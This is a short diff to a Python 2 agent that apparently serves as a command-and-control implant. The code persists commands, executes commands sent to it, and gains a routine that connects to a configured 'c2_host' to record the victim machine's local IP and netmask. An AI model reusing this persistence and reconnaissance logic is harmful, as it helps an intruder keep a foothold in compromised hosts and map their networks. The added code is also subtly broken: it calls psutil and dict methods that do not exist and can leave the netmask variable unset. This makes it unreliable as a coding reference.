@@ -4,11 +4,22 @@ from os import sys, path
 sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))
 import actions
 import json
+import socket
+import fcntl
+import struct
 from .rest import Rester
 from .lib.persistance import PersistenceMGMT
 from .lib.containers import ContainerMGMT
 from .db.SQLite import Helper
 from .settings import commands
+
+try:
+    import psutil
+except ImportError as e:
+    print "psutil is not installed. Note that GCC is a dependency of psutil. Re-run the Agent installation command to " \
+          "attempt installation of psutil and auto-configure the agent"
+
+
 
 
 def parse_args():
@@ -39,12 +50,30 @@ def main(args=None):
 
 
 def init():
+    db = Helper()
+
     def run():
         persistence = PersistenceMGMT()
         for command in commands:
             print "[+] Persisting %s" % command
             persistence.persist(command)
+
+    def get_ip_info():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((db.get_config("c2_host"), int(db.get_config("c2_port"))))
+        local_ip = s.getsockname()[0]
+        s.close()
+
+        interfaces = psutil.get_if_addrs()
+        for interface, values in interfaces.iter_items():
+            if local_ip == values.address:
+                netmask = values.netmask
+                break
+        db.set_config("local_ip", local_ip)
+        db.set_config("netmask", netmask)
+
     run()
+    get_ip_info()
 
 
 def exec_cmd(cmd, cmd_id):
